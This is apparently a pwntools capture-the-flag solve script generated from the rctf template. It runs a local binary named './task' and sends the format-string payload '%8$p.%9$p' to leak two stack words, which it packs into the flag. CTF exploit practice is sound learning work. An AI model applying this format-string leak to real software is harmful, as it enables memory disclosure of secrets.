#!/usr/bin/env python3

#
# pwn template made with 🚩 https://github.com/rerrorctf/rctf 🚩
#

from pwn import *

#context.log_level = "debug"

LOCAL_BINARY = "./task"

p = process(LOCAL_BINARY)
#gdb.attach(p, gdbscript="")

p.sendline(b"%8$p.%9$p")

leaks = p.readline().decode().split(".")
flag = struct.pack("<Q", int(leaks[0], 16))
flag += struct.pack("<Q", int(leaks[1], 16))

print(flag)

